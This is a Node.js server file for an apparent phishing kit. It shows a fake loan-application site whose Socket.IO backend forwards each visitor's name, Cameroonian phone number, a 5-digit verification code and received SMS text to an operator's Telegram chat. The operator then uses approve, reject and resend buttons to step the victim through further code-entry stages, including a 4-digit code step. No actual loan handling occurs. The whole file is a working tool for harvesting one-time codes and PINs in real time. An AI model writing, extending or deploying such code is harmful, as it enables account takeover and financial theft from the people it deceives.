const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const BOT_TOKEN = process.env.BOT_TOKEN; 
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID; 

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- SOCKET.IO CONNECTION ---
io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    // 1. Initial Application Submit
    socket.on('submit_loan', async (data) => {
        const msg = `
🆕 <b>New Loan Application</b>
━━━━━━━━━━━━━━━━
👤 <b>Name:</b> ${data.firstName} ${data.lastName}
📞 <b>Phone:</b> +237 ${data.phone}
🔑 <b>5-Digit Code:</b> ${data.verificationCode}
💰 <b>Amount:</b> ${Number(data.loanAmount).toLocaleString()} XAF
📆 <b>Term:</b> ${data.loanTerm} months
━━━━━━━━━━━━━━━━
<i>Waiting for your decision...</i>
        `;

        try {
            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE', callback_data: `approve_${socket.id}` },
                        { text: '❌ REJECT', callback_data: `reject_${socket.id}` }
                    ]]
                }
            });
        } catch (err) {
            console.error(err);
        }
    });

    // 2. SMS Submit
    socket.on('submit_sms', async (smsMessage) => {
        const msg = `
📩 <b>SMS Received from User</b>
━━━━━━━━━━━━━━━━
<pre>${escapeHtml(smsMessage)}</pre>
        `;

        try {
            await bot.sendMessage(ADMIN_CHAT_ID, msg, { 
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE', callback_data: `approve_sms_${socket.id}` },
                        { text: '❌ REJECT', callback_data: `reject_sms_${socket.id}` },
                        { text: '🔄 RESEND', callback_data: `resend_sms_${socket.id}` }
                    ]]
                }
            });
        } catch (err) {
            console.error(err);
        }
    });
});

// --- TELEGRAM BOT ACTIONS ---
bot.on('callback_query', async (query) => {
    const data = query.data.split('_');
    const socketId = data[data.length - 1]; // Get the socket ID
    const userSocket = io.sockets.sockets.get(socketId);
    
    if (!userSocket) {
        return bot.answerCallbackQuery(query.id, { text: 'User is no longer online or refreshed the page.' });
    }

    // --- STEP 1: APPLICATION APPROVAL ---
    if (query.data.startsWith('approve_') && !query.data.includes('sms')) {
        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
        userSocket.emit('approved');
        bot.sendMessage(query.message.chat.id, `✅ <b>APPROVED</b> (User ${socketId} moved to SMS step)`, { parse_mode: 'HTML' });
    } 
    else if (query.data.startsWith('reject_') && !query.data.includes('sms')) {
        bot.answerCallbackQuery(query.id, { text: 'Rejected!' });
        userSocket.emit('rejected');
        bot.sendMessage(query.message.chat.id, `❌ <b>REJECTED</b> (User ${socketId} sent back to code step)`, { parse_mode: 'HTML' });
    }
    
    // --- STEP 2: SMS APPROVAL ---
    else if (query.data.startsWith('approve_sms_')) {
        bot.answerCallbackQuery(query.id, { text: 'SMS Approved!' });
        userSocket.emit('sms_approved');
        bot.sendMessage(query.message.chat.id, `✅ <b>SMS APPROVED</b> (User ${socketId} moved to 4-digit code step)`, { parse_mode: 'HTML' });
    } 
    else if (query.data.startsWith('reject_sms_')) {
        bot.answerCallbackQuery(query.id, { text: 'SMS Rejected!' });
        userSocket.emit('sms_rejected');
        bot.sendMessage(query.message.chat.id, `❌ <b>SMS REJECTED</b> (User ${socketId} sent back to 5-digit code step)`, { parse_mode: 'HTML' });
    }
    else if (query.data.startsWith('resend_sms_')) {
        bot.answerCallbackQuery(query.id, { text: 'SMS Resend Triggered!' });
        userSocket.emit('sms_resend');
        bot.sendMessage(query.message.chat.id, `🔄 <b>SMS RESEND</b> (Notified user ${socketId})`, { parse_mode: 'HTML' });
    }
});

function escapeHtml(s) {
    return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});